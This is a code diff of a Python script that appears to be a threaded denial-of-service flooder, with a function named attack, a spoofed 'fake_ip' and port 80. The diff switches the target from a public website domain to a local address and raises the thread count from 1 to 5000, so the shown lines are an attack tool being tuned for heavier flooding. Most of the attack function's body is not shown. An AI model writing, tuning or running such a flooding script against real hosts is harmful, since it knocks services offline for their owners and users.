@@ -1,7 +1,7 @@
 import threading
 import socket
 
-target = "www.bullcurency.com"
+target = "192.168.0.1"
 port = 80
 fake_ip = "182.21.20.32"
 
@@ -24,6 +24,6 @@ def attack():
         print(allready_connected)
 
 
-for i in range(1):
+for i in range(5000):
     thread = threading.Thread(target=attack)
     thread.start()
